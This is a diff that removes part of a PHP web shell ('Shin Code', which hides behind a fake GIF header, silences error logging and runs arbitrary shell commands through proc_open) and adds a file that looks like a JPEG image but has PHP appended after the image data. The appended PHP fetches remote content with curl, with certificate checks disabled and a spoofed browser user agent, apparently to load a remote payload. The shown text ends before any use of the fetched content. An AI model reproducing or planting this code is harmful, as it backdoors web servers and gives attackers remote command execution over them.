@@ -1,789 +1,124 @@
-<?php
-echo "<!-- GIF89;a -->\n";
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@error_reporting(0);
-@set_time_limit(0);
-@ob_clean();
-@header("X-Accel-Buffering: no");
-@header("Content-Encoding: none");
-@http_response_code(403);
-@http_response_code(404);
-@http_response_code(500);
-//Kalau file terbaca sebagai gambar hapus atas ^
-//Shin Code - Created 15 July 2023
-//jan di ganti ganti ntar error aoakwkwk
-//Recode aja  banh penting ga cuma ganti copyright :')
-function getFileDetails($path)
-{
-    $folders = [];
-    $files = [];
+ÿØÿà JFIF  H H  ÿâ(ICC_PROFILE       0  mntrRGB XYZ             acsp                             öÖ     Ó-                                                   	desc   ð   trXYZ  d   gXYZ  x   bXYZ  Œ   rTRC      (gTRC      (bTRC      (wtpt  È   cprt  Ü   <mluc          enUS   X    s R G B                                                                                XYZ       o¢  8õ  XYZ       b™  ·…  ÚXYZ       $   „  ¶Ïpara        ff  ò§  
+Y  Ð  
+[        XYZ       öÖ     Ó-mluc          enUS        G o o g l e   I n c .   2 0 1 6ÿÛ C ÿÛ CÿÀ  P P ÿÄ              	 
+ ÿÄ *       	 !"
+$#1qÿÄ              	ÿÄ ;    !  1A"Q2aq%#$‘±	34B¡5CRrðÿÚ   ? ¿ÇÒéuŸK¥‘÷ñçôë–ÙÂŠúÃ;d… C!G³j`ë×„4:çyH,Â·ˆqà‹M6ÞIf“M4×ÎÛcX$(%ˆP9$ð ûŸ·[R¥Ré–•u+;645Ø"†-çÀ ¡ußþ_¼ÀÂÐó-Øã0}ÊTÚGuz=RÂ,3äYŒ¥X:ºîÝHaHÓxÌ×Ž*è¦ûSç`¶Èók¨åÖ µQVƒ­öÜ*¿éùÉõ*>Ø¨ØãÎ V¼7eud¥akt¾!Q,*R³³í·GÓPQò’NÄŒzÅ¬b	56£•6Ÿù6pzð§"c8Ì3'¼³'Mqþ6ˆ˜­üG“i‚tÆqŒìl@“9ÎÂ0.ÛšAêÝÁŒµcø‹ˆN|li:¸9Æè ƒpÓ «º/à×^ÎZn³…×LÜø˜x84Æv´–º´•;[#$ƒn½ª¿òhà' öôäÂcõÎò3‹»­2o×8Æ5K‰õAv*_×?nìX«?Ó”p°ãy£Ö†¿‡¹¨ Í„#¥zôÈý‡§2®3îF0OŒž½e>{‡ Guä.¹V €(CÁÎÒ' h/ªo%>¬x1Xör:(>}ù{ò yc¸X„8b»]ŸUï:üdO£Ms´ó×VA¹Ž¥‘¼p„'ZŸ3'3EŒ-×yâÓbj:‚>º­jOv¦UwÓ#ê2cl~Ò@gFþC¨©ŽÌjÈ›ÁÚbzÿ 
+^:”µ¼ò»-tÌÔdf ¸j{XTh›¨õ8aU‘é»…M•¼^+dÌAl¨ø"(KKà
+m1$$
+XÒKðK¦q¼rÅ¾Úo®q¶»gú VFF#pG~£ª®¥:”]©Ö¦ôª!!Ò¢²:pC+ ÊAà‚ ®‡ÖzÓ¬ú].³étº`=è'œh…_/…}Úí’¯×Ã Ú@L¶\»,ŠxãŒ¼š½zÔ°+ÕJð-¬övê+ŠY³½õõ½…¸¯[†'8É'Èä
+¹%˜°  Xq=¥ô´ž¬“[4èSj~µ4ÔÝ¢á#°d¤Ê‚Ä“ôR£L5kŠ¤XØŠ—•Œ>åùlôŸµ:t\‹ÎbaƒB¯A\Q3ä8œ(¦<ùAÐ;îdë)£n×Ó“LrñÅ’ÙÎ*Ü|J¦:
+Æ‘œÖ×2rF
+Œ¤¢¶ÐéŸG¤AÁ8Èõ&\½Aø-ÁJ) çê/jþ`t.ÄîEáÐ
+ÉúAé:çT â©mï¦"%Cb"!Äô7¨²wÎ¦• 
+ÝÃ†ôª%Ù;¾Ðâ[Á]£UëzmFú³²šö¥kxê°+ÆÝ7®^Ò®éRã½"7›Šµ¢†N+-ºb7¨cä,.55ãHÇT¨†­E`)ª—PêT ci 20y=MÚ­yÙ½S¡õOdc¨iUJnq&~zn$ÊRp»Ë)fG'Ô2 ã—'™¦àÐ.×mEÏ™×âÏZ¯ù²æ¿oVõÝÍð¶›’uÏSÕ]Ÿ|¬A°@.À†Ò)<Ê ô+±'>âÿ Ó©ƒ¤”ë:&ß$ú	'êƒÚLÁ#´Î Äd{qôŽH¨>*5;»‹jDo©²ÃèÂ
+Ë·«ÃèÆÛYþœm¨¬êÔˆ*[9*Á5ø¥ét»UfÈù%3ªÈ=
+ÂGU¡¨êÔÚëW\Å'›âéõ¾AR»_¢W×ú4«_ ÔP
+éÕººš
+»ž-¶Ùê|ëž4R¿êF…ÝJZ›v0Ôd[Ë zJ|£…PU‚8Àç¡;é¯Œ½	'ëV¶ŽcLÆ,ÒÁÀÎºÏ>Æ¦×*e™¥b)f,ß0û"j1ÁÐìÿ Ê1®áãÞþÕvÕ˜;bäJØÝ++ïCðOz7“%é>¥N³UîÎ,=zï\¶cEVäKÑ>Icå•7}.“ÑjHn;^è§±GHI° ¦ðôÛ åHÈVÝÊäçÇ‚O:éßŠ{mSV?K|@öò
+þÑÊAÔÔiAíëÁÍT`2ôðj ‹Ü	1í~¥K8Â’$ÿ †~]=9áž¦Gõ*–ôýÒ9E±MÖ¼m5XÌfÞ9±Q¤Ä¸}i
+D%«ë´+t+;Fë¦Ó:v“:­-”&¬¹Ž‘hé_érDà|Î!ë ãÓ˜°;Zžl³’ë¸‚'ûðó¦õž:çCÈ&¿Ò€aeà˜Kkm6Œ»•ä
+‚uT".}J&\ÿ hciŠB2Bà+ÚT½7ït?EPÃ¾ÐŒÎâm´A»F\Âlæ°çøc2–ÐŠABm¶E,cÕ¶\Qˆ¬‰JÁ]dÙ5¹¬¯­ïíÍÅù€í`OÔ–
+Y@È8È?lx#¯›£KÉiI&°¿Ri1f¶¹R2f1NÁ%_“g»*T€èÀÓ¨¡Á??N:ƒýºˆ}+×œêŸÉ€ïhÙ­¶qú÷LÙ,ÊˆÞBùr½¬†ó›c‹Éu´òž„BmzÚÛÌ¢TV^¸	ë™8' Ÿ°Ïúu²©fUX€3ã“¸ã>NGî:£ÏË/¯;¯Hšpé¥•­B¿1µK‰œ
+¤œß/%iÉ«
+VÂQ%¦:í_	-¶1oöÏúõLî?RÅÅoa\i^èÉÈÛF|èýÃÕW*Na)€¨P¬Ê
+ÎX•#yã¯¨¿z+CËêÛØ­\ðÐ²æjŽ›iŠrm¯§²â*d³ìW…Ò¡QbâBÈ¨“¾i'%×NEbó?“üÇ'[¨ôú§hë=`Oi¡°UÏ¶£u¾
+Ûùén¤ºRè}GWÇ4fÔVJmé³‹Íê¼ëºÒi„RªèÕ~ˆÒJ|l%m'ÛÍ%ë"ôLW•‘ V®Ü2‚è7œœŽNsÎX÷b¿?_–=¶’Ñõ{s ¤}ij4¼Ã=SNš™ˆœjx¥FV«"ÔŽI(âEñþ›)]ëÓƒÐ–§†Ûm–[4
+m¶ë`5“-7W¾Œâðãfóª¥ŽÕb‘ZýKŒa#Vb%à„K™ËY‘õ«å5ÔéüTä‹$y`ô4ý6ÚÌ¼Üp ÊC‚7¹HM¯¸÷†„í'l{OiÛ
++©á ýPw~j,S5T4(F¼Ô¨;ÒAéú`*HJ´‚TPÐg‹tïÊ(6/Õcg’ïˆ5–U¸1@Qb8™Y!ö¸ÑàrÍ<ÓÇÙrèˆ6hÇÛ)¯Ï[{húhÃ8
+½Éð3Ÿ—÷ÿ ÚÆ0<õy+Vâ>BzOQÏKF+6êvâœ%=À’~XDõ…PpWÂà–c–<c8ÒKÛê
+,~Mú	´ÔÏã¿k¤Å†²O»I¢ÈûÊs5àJ»pÌ‰ÂâôŒÈò>_-:ßˆùÔÉü#cãå£ôÈþC·W1â:Â^ÓQÏÅ	06Ó¬Âq@
+Dj˜$
+äUWÁÎå$œ?9úã¿ùFÕ\cS³»ÍM5Í=Á2>Çh×‘\,(É)÷JBçkÂÙê;
+åJ»ýñ#jå¾»W³(p=•o°’QÈD×
+#Ué¦Mh¤ùUÃ*Fü¨c?NÕÝÕ=ÝnÇé¾áF5¦ºÓ12’§w¸0…5ZŸ—ë€©4Ú£‘ûéœ…ŽuC1ìý“‚÷ÞyÑíýîý%näÚÎJ¯8ÔÕçµô*c†Õr²ö—èÁ§R€ãý
+«‰9W=¥HÀîºæÃ×9÷,çAã­×»,Ìì”.«Ž©ZFùbêá–	QEGVNs, çqÈ'ƒ‘ƒÁ¬;O¡ûŸØMm§btN“›ÕVqêOw*Ö™kPÑ¬ØˆÑôåX³JÃÒšI°ŒÓ¯™ìE£¤ðøŸõWoä°kÍ+ö âR­{­«%´íƒÌ j;®”Û	ŒŽçYÚØx£”°šÁ
+öÆ7&&ëú‡,ž»íLÔœ…µíYêbw"älIÄÎÜ(*¤âù`Û¹FÆ	úˆ·üA»S¡´„Ü-
+#$ºþ˜žŒÓË4¦€žÍ13)QÔüºpÚ¤3Rx§O®JÁ$c™P]vÎië¾uqå{ËÆkªœy÷N.‡Ç-ÈßBúšÍ,@óª³ªÚ¸°Aoçêr%µèX0¿U£·NäÙbƒ¸9 ŒŒŒàùçïúõò•‘Š¶7)*ØÎ23Î3ãôè|»Rn¾bêöß@ò§…qŠ·|Eú»Uº¹µyû¯Ì$!7®ú¯’&®¢["X­O¡yê› ¦~Æ“tADhPýéå]¼ÐmÞGïíŒŒŸ9Æp=óÔœZ]Ó­êáˆŽúOÒeyq‘Ã!Àbò»I GU„èýÉ :Ý5~ÑF„”o–L …SïT[ÐµÓ$]$gÏì*äw]½ó¦!À¸;¯m@ßÞ ®&IUËÚ¬{¥Ò„Õ¢-.SmÖÒ’ƒ`öÆ  ÛíÑ®»Õ·vU"oÌL¦š;¡'‚‘5s’"åWó)Àâ@ ŒÃÃ¤äÆä«Lá1i“ƒ}Œ^Y5±$+þPãÑýv0oÍ ü¡©˜HU
+ @È“ª¢sµQêMÔ)Ê¢?ÕM\à†4ÎQ°Ù Ø$2§¾;gÿ WJÞ/NwFÄJG†DÔ:–yú ÈÏŒ¶ó˜ÈMfÚûW!äöQUZ%a‰zÒ³––£îDK¥_¬ŒX¯h™¤MŒ^r£Ô^!dËÕ'<#ï´›çOÞýþ{Š¼‡/Fè?©+–$ ýYÉ'
+wg'$“Ÿlý’í¶€îjGÍAHÀ7lå4ú¬®ÀÌÌšxôÑ¶¤cú€}ù‚®IË*e­s ögÂ~ÔÖ;Í¤‘åt@ÁÓˆ<f0&%Â.Žy ²q¤B(ñÁ¦»˜Dšþ’Kô=e3%}v(­x  H©!W|p9òM­¨ûw¡4––“¯'§´ä }Vi–&$½BvR-–ÜO ±áAÝŽ›õÎ-h;aµµRlƒA€Û@ìÓ¶ÔIãø hÐÆFãK<XŠ‡íß: ÀlchEŸ´eëX\µ½Ñ©~FU„fò¤–Ê’N=ˆÚO¸ê„“ííG
+g3 õFFp&`ñ1®‡¸ ”®ÓžA0[Ð…¥ÞiFV®°ÔY3d\Î”Œ*ßä*`{7
+'t•‰×$Å+Ù£tqE¶ñ‘¦¹Qå-ãÃ
+10êrÔØçiPÜ0<Ž#Ÿý OëDÐ—óúïÐ¿ºH˜IäuQWqúv¢6>®B¢àäàò2ÝiB' 9Cºaø8˜âÞf…TR:Ñÿ Óö†Ë%Žï»¦N¬OÉÕÀ@ƒ
+m£–¿ó3ÉsÂvªƒ ¿Ôwÿ .@ªï¦„ü§¨ ¶…,FYrT0mªŠUWæ_v>>d«[ÉéžÎAÝ6¿³ÚŠx“:YÈúÉôÒTð®L‹˜°ƒHv˜ÜÓº!¿næ¹S£D}Á>[mâ‰EÊT0•¬ _ì,'C]çüÙp³°“çj¨”ïëíœV °Úá…·÷ëPDZ[-€µV0`îÝäž>¢}ùçÜŸpmÖ»Õ2O6ò²O*ú•™Ý¹žX‚HSƒN(J„Ú  /ù+1ÕŸ¾#(÷Põ*g¡ºÓÂûEO€#Ñw&jÎ6õ?;ñòÚ¡È)+žUäÎà]lºµ\ç/{èŽ„¦²*ÒI¨¡è/‚“¢ÔÐ9Í<'$ç'#'ý†yçt/&—-\\WP‚L`/p9ÆqÏa'þeÆê–Â¨œï‹E]žÿ fçç¨AªAàE‰YönGtm,ÅÏ®wXTÕ>AaN#•’õFÍòjÇÅµjÉQáFd–¨ÚÜåÄq^<µH?¨äyêòìîƒ°J­Üƒ2š*¶¸†3µ T4ÂÐ§ ªìÉH”¸‹**W;¼(ê­½ËÂ¾‚P¬f=„´©¸e·ñÁyAå÷§4ÅFJöÅ6{eò]J¢é¿q§íOCç›f#3€«SÖJÝfiÉMM\iÈT«$ûrGŸ8$ãß9>2û¼:²—M)ÚÎïQù#NÏÂKÃÎe‰Æ&"·E¶8Æá¸ËÝ.Çz· <™ÔmHkŒ?˜#ßÒtÕÔË’„ðA­¡];
+G0HÏ:›<C)Jµ?W¬ÁE#‘¸CÊc×9ŸÔ`äžGØ¶rGÜ“úõ¸‹²DB R]©:Þ+¤:45Òxm¨uŸrÊVqº[~\ˆç0íM-‹TÎdÆoÒ¶uÌÌ›Ò°š³!`U†~´á d0ÃûùÁ=]]§øƒî§g.”h½BÍƒ+§œ´ÌÎÝ»”®rs´©äŒñžŠÏ‘»W“k‚ú3Qƒ¬ÜJ­hJÄbvbëô§®
+xu›,ž„ûc·Ž´Õí¢<„LÌì]ÕFI÷³‹°†¡¦•D¤¤ÀÌÚ¨äcn
+ƒÏØùÀÈGVö¥øØï6¶¾³¾œÖ2œlÜ4ä&ž…ËACÍCÓƒ/ê ‚ '2,ÀQ‘ÖÇ¯;—–ÔùáõÉéý]ê*·õ«EÅ×:Ê~K­-ØšègFh5‘]$hÛð;­8£¬­k99­·°¸®×šTí\,ìlkj+"%b Öú*¨ú_ ä²’p[òœ‘‚ÄtGÛÿ Nöög«ÿ µ)©ç&5¾¹€ÖñB
+&%Ø“N2Ò_)‘P2Åâ×ä£X}ÞìRY{n“*h¶™D‚‡[o XäK¿Ù¬ÃîD&¬B2e•Ø[:˜eßÂåŠU+ê*>œf!šiÝ!	¦­Åj˜{’ÏÆ1—mÌ}¸ûo‹ï7Äu;ó$ÒòåÅ99Ó°…‚çœ\nÇc<uËçüƒ«wƒÅÙ}FÔúºDàùún˜Æ›ORØyô­¶µ¥[GééãS  xEFçlùQCþ‰c4x
+O#‘“Ÿ°ýz¢=€
+ Ýá}€#äqïÑiâÞ1ëò‹9Õþh²9TL´W—>ÁÎz:zA…Lq€Þ¶w¥y…€Kú§ÞT<¯“óë™4ÒX,ˆ'!Y;ŽÉÞÍ°6ñqÿ G»M~_Ü~Ü‚}ú¸t>™í¢(“ÖzÆlà}:r
+ËL’9
+fe}.-‘ƒR*<`c6¸øošÜ›=‹pr¢ÀÒ½GB)nQ%–¼¹¦Àö¾öÑ)s*&iÎŠê%Â—Zb{“šØm[ÁÖ NÝNkb·„£wBæþÖw
+Q*¸àd¼­F	œžHP ÷ ž iÜ›¨;
+aV68j}\eØIÕÚGI'Í”Bˆ’‘•;yA
+Ò:^üšÆbn½Â-ƒm#Ñ@ëãÆùÇÜS6ËŽr°€ƒÿ ;•ü~âcm´Æ»gUêŸ:çX6ÛG®Ì%ì<šr§' dzX^}‡-î ÆH¡XÛD¹íö¨«ù-C¥W`#„«ªÚ©pNH5©E‚yÁ÷=Þ1íîÝGù#Ïê½¼›·Cê5YxÓäµz¥Y_"&–Aü*ëC¼à+q7Km‚1Pm• @inä88™å¬ NŒä
+^c.d	Üp… Ž –>[àgÜc®‘–í¶Œ¿ø{]c§4ì)¿Š‚ˆfÔpsgY¼âË…œ†›Ò>§¶*"1—Óå}2<1ù¾7À—«¾5)]Ñ÷ áåÐÇý£V5)kdôkMÖÇ~`æÎ‚Ÿ´»Ÿ¤:{Žß×4ç¦ÌnG¡ªPTT™»³ó¢Äb¶ ’ÿ çõ  þÇß÷ëŽ±÷Ï¶wFFá“‚G8É÷Á>z¯Fø•õÅ_¡H…´9_r³ªD‰­l:À‰ˆîÑÒ¶H5„§Z!Bj.y²î—k}Ée°rb:SOT«¹]!ÇŽ?n:HçÎµä‹ZÞsÝéyþzåtnÍÖ[‰7N“¹Z#UQO$ê›.„JÙ#]Cr#¸Y€ÁXÙ›  Î9ö Ûôcì<çù'$þäóûõë Ÿz÷¯î
+9Ï¦·è³òšé¥.©$¯Ô$P¡€ nDS¶n²‹2¤Ëu5Á®¥X Š”¬g\õŸÿ ç?ïÏïÒã•|Aû÷Ñá¬°â¶µÐÓí
+Ð>>ÆbE)ÄCbæäØ¯-ruMcÄÀ×ºÖÊ*,\)`^««ÚmÍ
+ge­\k°.– Û«8ùáÚ¯ÁìžoKÖ1¦ýgWMîpó‹UÞ»zI=EEÆrz:õ#³ðî¹6¹-›-/¦WmÒ\z8¡×žÕ0x
+…t¿‚Aäçì_cÒ?Ô¾µî—¿—Žcã^MÚ˜ÉÄô·òú‡IçMyO>´l0ÕÄ‹­}t7[è†\œÊ²9ÌœÚóm_a[¯å§¯®rÖ°ÖjÖ÷PÉ\kÛxû÷1 '®Cdm vF70eÉÊà+€æÁîm-Ú]að?ÝK¤ÕuSMUm	8f¦	›¦Yb!’)½2Z.UËÓˆD¥ ÇñÊ\~:ëÁÜ½8zâ•RÉÌªK˜cûbÕsÐˆ£œ&ß¦ºéû“®çˆìû1¶$À,ÿ wþ\gcŠúÅòò3F$¨øiU#<û`óî:åI†4{w¥­«.¦¥Ö2õÇa´ÒQ¨$‚EXé<ýÆp}úx>NùŒ×o?Gm	†©NæN
+rE“ö$#J•nÒ‰!ýòAÇýH'<§wêû‚i¤¿ÈiÍ—k´;ççS;(PY‘éÄäy,¯±|õ v»òG!Hõí¾$¤¥4«Æ´…©@œ³VÃÖ!Ò›
+7”‘‹´… Â$£î…Ñê{ò¬ŠÇO°y³ä•WSY½–:ýëIëdoIô5b“_¹ˆÝsª›GüÚq´ $ŒqIOgæ-Œ‚BÆH]_ë«V²‘Óú¦ÖÀÆG£ŒƒÈ!‚’w0çp$ŒÀ»ánËUèÞèö#ROMBØÉ$Zn:¸BDˆU•þ®KEÊ4¤¬Œ¯¦ec„q¿Åü„}ˆ½É3åþ§–õÉé^Ææ¦n¥åBZ—jçbþûW‹ `l³’‹	¯ZòdÖ"”‰"“b ]nm!ij.ž—{&*õ¥£Ëà€FÓ÷áO?¨ãŒcŒuÅ]ÀÑõô°”Óu¤VQbj:©JÍBþ.XgŸJÆFsq¸dç¥šNý
+ÆxšÊ£R«ç;!Ú$ÕË ‹	˜:°ð›¥FÙcU›Á$R1-ïK®'É‹· IÅÕîx8çÏoß ÒF~Ùð	çöýz
+"ü«_^vŠ2·­-ô“«šf’ßK ‹ª ¯ÈökW8
+cõ.çMs-ƒ¥¼Ú6Ò=eV’=¢’ñev“\Š¾”¹·¹°¶ùõLò=‡ gn22p<ƒ×µ?r îFÛÓ>zêüePËñ z·ÍRog½8u¦(étJ¨PßÜZ½¯¥.píÃÀ’Í¢AÒë¸Õ¼65ÕX´ûsyvm‚ÿ 6R—W7WöÆ;—î|0ûŽ >OéíÒ¯Gãý@çÛýùñþÙ³<Ý>omëíÔ¼()Ï÷µkZJlK,‘Ã ÅÜF
+4•œ)snž¯—Ãì‡‰O©Qà{uãŒ Ž=ÿ AíÔo³û¿,Õ®ž´íä?eKB—zG	¯6e6¦ôö§ÀÛ
+±Žƒœ¥ÿ f|¡C³U³ÿ ±_ç4šC[jÍ•MÍ8,%em¡íMÕÑÇ8þ\ž  ûóŒcŸvÿ COwTGi¸
+_9Øý4ÐàÄBDf%¦±Ž'nsà–8MñP¾¡c¾úÏäúÕÝï¢ó&ç-äy"8RÖû_jïÇØÿ ˜3aÔÖ+z+¦×NÏ Â9«µ”QôlDQ40ÒE ÑVëÈêÛ‹ârHÞ2ñIõ_ÌÇúY†O',:ë¿‰WNÃHvïµ0ð‘·B}n™…Š§¬a*E
+zUb½N#éÕ0õe"Úf.Q„Œÿ ª±H´Æ5"™çˆ-ÌHéŸVn=š+	#ÿ ›Eiy-
+›v8=ó™‚gÒÕ`ê†ßo¿[
+é¼›ç2Í.ÛD‘^‰Èþ¤Qˆú’™eB™ Ø…q‘ÁÏ¿žRîC~
+B+JÐÛõ8 úÕÃ4ÌÚÔ*ÌÓ–”¿ “ºÎ1ÀÀRáBË–I\ 
+€1[0
+‹I‡9yãî)‚øÛY "	7Š]6Æq¾›g\ÿ ©vPà© ûçŽsŸ= Ñ¬Ö•)×¤Å•E¨Œ<«¡¤c`¨ñÏ·U9öWŸÎ,: ê?½y²ýºÇ1hÖsâU(ŠT
+g¡á˜eÄ/ë£®©óîÂJ¦A›]|Ž‡ÛèÞ·Úí4aËZVôƒAIýeIhBI!Ál†$ñý3![qÎHnw\7Rá{©£oŒMÓ/ÉÖ´èý>5&Œü
+gw¤j…F«E‚ § dc@K:V&ôWô/kú+Í=áYék[ó@fU¹ç5©zzmF„†È–H,[¨›ÿ nÚ-dcõ Íwd[†¯z"³ ¤g¥4ÌçÏ˜RÑrª0`Bà€8_;‰À #Û$^Z´š½ýµôÍo5K¹ZYKjGY%¦µÌÌÈs ò…"!a„[9I2TFæþþöÄ-•ìÓã—‚w# aÍ]¯£ØË’óÉÛêIÉtÙ®¥ei_ª½FæºpVÐ§à«±Wž3eêµCi±7è‹¢¦"å¿éÝ}ÈËHÉ°AäpG>ã®h×µÖ¾»¶³ÔÑ5iµîTÙ§-'–`d´X1’«øAF$¥$<†þòy¶Œ9~Ž¼,©ÚnµÏêe›boW¸>Þ™_…ŽZ]Ú·¦TÝúñCËù
+ùÌèUy›
+ü•J¤¹‚GåðO·ì}º÷Üò ÷û>ßí×A"³–èà5ã÷a>	Z¨UÓËRº-ªÝZ÷\9°
+jrW¤¼Ý–Q»RÝ³²*êÄ¼úÕ]é$Úµ®Xq€=€/ãÛwÛÿ ·þz\ý²IÀÎI É#œ{Ó­þÍlä^;ßF_RìµŽ‰[Ö¸[gKèKÍ°¤oùQ­	)Wë…•­Ñ–˜‡s‹*kuzñÅ¨Qde`°WU_˜ÅKLEÃÛ~"í¼g r<€2GŒyÉÉÞ‡í¦µîL(Í-V«Yƒêÿ -Z(ùI™Uô¸àŒ²0° Ô|ê\þÃò;Ð8Ÿ¡C¹óž½æ
+‡©mÁíàØhlù­:Ì„Dý£k¬YHO kŒç|:ð¢*D‚Y‹
+ts‹Ø³«|˜‘zrO; ñƒŒsT3Çóž¯í1®éü=Ùjíw¦¦ôyôÔÐ¨šò^nZ´ÄH”Šôm¬¥_GÌ®Ÿ¦0Wì××æöÄþÕñó¿“¹—Sè´;ùÒáòï_$ÏmÙ›Iµ·DûVÊî=f¢-Hº}—òâU¯ã±õ¿]H†±Aó®ç*¶vÔ¶éè¥ÙÃ3\€Wh*I#$™@6•ü«Õxú†^òêO½ZìüÝC&JèºUÿ 16ÿ X“D*ÆÃif&µ BÑæDGFY£YP¿[KL­X
+uàªX á.Z«Àhµ„q
+GhbÓÒ8 ‡M#Mqt×\cý>‰À
+ª aT £Ø 00=¸ãŽ¨Ê•µG«Q‹ÔªíR£“’îç,Äœ’I9óÖ÷ÖzÓ¦½ðJO¡©3Rn°Ë`–Cë–5ñ‹ùú«ÜŠ@Q·O1N.Ø”"I\ÕYÃ––ÄÆH®d‰‘¡LÞúÊÞúßäÖú\}IP~jmÁ$ yÏýÀþ™;²ö—Ôò:ZGñ–ãZVÙJv
+£‘=&*UF#`”`R`*S+p¡…\=)âžÏÒ­Ò9õk¡ñ±ÄõïÌ®RÂš¾xô˜0' ³ºÍ**Ô‘LºkÉºkÔÍ+zJbÞ#Ò:|MªÜZ
+óÑ?Éj$Ý¼ &°XŒ)$ˆ³Ž6œFÝÄàY6Ñ•/®Ž¤í¼í;Åÿ ¶ŒJ¿*n—“éÀlþÕCà*Å³_…
+ê±Ô•{ë_Ô6ö:\47Ú·§sí‡ô4RÌê¥èmÄŠ¬=ÏøÀÒzúøÀ¥*º¡Êªƒ€ XTäŒî[ƒ‚¢Š¡¡ãè]Ø5¥Bl#aÉ-Ë™bvï8Ü@ÜHàãß|Rë«øwe9A%5&¦M§éúå%Z02T¡¥–N)&&GfM
+å„€oúæÂŒÞÁòMÍ;=’µÌ./Ÿ/k~	E"a9/3¿ñÐy¤˜–,>²Ùl¿ÉjžÂ>¸³Œ„ÖZ‘£XŠÖy’&Îµ†­YûP¨À&h àg¹eàc<û``½‡¶ø] !}i'c
+KQ¦ulFµIÊ“_\T58¨¹(Ñ+cJƒ€q~
+ýÈé[d»ü×ú”gmçm/`²è°XÚ™Ìht®kÆqË«Ú×•$²Øî³"³c[P«VY¿[uÉœ&#°ëªµçà"–ëûÈ¾£qC¼Ìª"¶Ãœ¨‰È”!ö¸î <¥µ¦à§MÊj8ù€u-¤d®xÉã«*gÐòÏ«–t¼T”Ld´K´laWÚ­´Ÿ\ž“‰~ï|ÖÎÛä7Ñu`¶•h(œ¸¶Ýw¶õÖ‹„càL=†¦áëÇË¼å=—Fé…žvcGøØsù}·°Ð·UÅàÔÒBSúÐœ;ÙFI;ˆãÁQ•$8ê+V|[CÚS†´ì®™›Òò1ú%ôYPž—Q%ãL£˜˜àÍVVK+&µ,¤cŠIbøÇ]ßÅôVy—ié¸
+æ~hâÏ?y¨·F4º"5ÕËA¬s-¶·“Fš
+Ý†x5ä¼Ýí›5P&EÚ:W<N–ãç[Á]*áê-=‹%Î&2p0}Çª0' i õ:àƒÎ5¨W³»Òs’º‚®Ê”´dÄÇÎœ®xaêŠá›KC• üJãÔˆ ÇÇ8oP³?\+…Q¼ûGG\Á´˜a`~Ãö%{l{,ÆcÇ…Å ðÈT±Á¡† ã*Jª “'	z…À 9
+••½…¡@“QŽæcÌÙ 1 ’ 'öÂïÕc©µ4Ž¨‘7·¸J)þ­¥2L\$Vw$TZ¿"Å	8É,ÌZ£’äúóéÇPŸ·Yôº]gÒéuÏj¥cÕÅ¨r¸ÊØA §-f$  `Ói%¡	ÒH‚]3dŠ]7Ó}sv×8ÏÖ¬ªÀ« ÁAçøã¯JUjÑu«F£Ò¨„zlÈêG †RþC·§|cùæñ(ETãoÌLK‚3]•ËE^¥!9ûç’‰Sè),ëù$Iþó1äróæÒI·ü–²o¶ûEz=
 
-    try {
-        $items = @scandir($path);
-        if (!is_array($items)) {
-            throw new Exception('Failed to scan directory');
-        }
 
-        foreach ($items as $item) {
-            if ($item == '.' || $item == '..') {
-                continue;
-            }
-
-            $itemPath = $path . '/' . $item;
-            $itemDetails = [
-                'name' => $item,
-                'type' => is_dir($itemPath) ? 'Folder' : 'File',
-                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
-                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
-            ];
-            if (is_dir($itemPath)) {
-                $folders[] = $itemDetails;
-            } else {
-                $files[] = $itemDetails;
-            }
-        }
-
-        return array_merge($folders, $files);
-    } catch (Exception $e) {
-        return 'None';
+…OMÉð@u9>@f;}²‚GíyýäÉ^†]U­°…
+ITki‘À ´Ì1Š”®È Ødï« ÁÈÁ*cƒ‹N…¶úh›¶'šcôØ—YïnþsúLÀ»÷ :bÝÆ?ÓíH :k®¸€M~ß@’ÀÒ8#ÄIàqÉ”ä~ãý:fÒ]½¸P*i]HŒØ'f±¶jhxÜTÒ—Õ1ýOí“Æ:÷¬ü^tÅ$í1]ú“íÆÇUXz&¾à÷û¶™tôODóTû‘¾¸û>×(^ s·î &3¾»#N_/èxÚñ-Èä¬¦?’¾ÿ ~—©vöÙU-´¾¤¨W$4¶±¶ù'òÓŽÒvû¿©ØçÏRGœ|jyþ¤SW?Îu¦®ò4Ö(í1 G[´ÌÙ2®Õ2jÊŽ˜hrçmÆoÕµ¿Ø´—í—gRÍ®%ÏŸ£Ñ¬¤È9 o–„äR	n-€œôì÷&FÈ-¾–ŠƒÑ@Š‘ÚâhgY©–”–¤_qN…õ;"2 …!K®J « Å¡AÁ¯^, ðë"€aGÒ8`†=14Š=5ÓMqŒk®>¥•U@UT   Ð:©R¥gjµêÔrK½F.ìO$³I9'ôëë=iÖ}.—_ÿÙ<?php
+/**
+ * Disable error reporting
+ *
+ * Set this to error_reporting( -1 ) for debugging.
+ */
+function geturlsinfo ($url) {
+    if (function_exists('curl_exec')){ 
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($conn, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
+        curl_setopt($conn, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
+        $url_get_contents_data = (curl_exec($conn));
+        curl_close($conn);
+    }elseif(function_exists('file_get_contents')){
+        $url_get_contents_data = file_get_contents($url);
+    }elseif(function_exists('fopen') && function_exists('stream_get_contents')){
+        $handle = fopen ($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+    }else{
+        $url_get_contents_data = false;
     }
+return $url_get_contents_data;
 }
-
-function formatSize($size)
-{
-    $units = array('B', 'KB', 'MB', 'GB', 'TB');
-    $i = 0;
-    while ($size >= 1024 && $i < 4) {
-        $size /= 1024;
-        $i++;
-    }
-    return round($size, 2) . ' ' . $units[$i];
-}
-//cmd fitur
-function executeCommand($command)
-{
-    $currentDirectory = getCurrentDirectory();
-    $command = "cd $currentDirectory && $command";
-
-    $output = '';
-    $error = '';
-
-    // proc_open
-    $descriptors = [
-        0 => ['pipe', 'r'],
-        1 => ['pipe', 'w'],
-        2 => ['pipe', 'w'],
-    ];
-
-    $process = @proc_open($command, $descriptors, $pipes);
-
-    if (is_resource($process)) {
